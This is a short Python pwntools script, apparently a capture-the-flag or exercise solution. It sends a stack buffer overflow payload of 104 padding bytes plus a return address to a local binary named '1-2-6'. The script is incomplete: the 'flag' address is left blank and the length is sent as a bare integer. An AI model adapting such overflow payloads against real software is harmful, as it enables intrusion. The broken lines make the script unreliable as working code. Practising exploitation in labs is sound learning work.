#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


p = process('./1-2-6')
context.terminal = ['tmux','splitw','-h']
context.log_level='debug'
gdb.attach(p)
context.arch = 'amd64'

elf = ELF('./1-2-6')

size = 150
offset = 104
flag = 
payload = b'A' * offset
payload += p64(flag)


p.recv()
p.send(len(payload))

p.recvuntil(b'ytes)!\n')
p.sendline(payload)
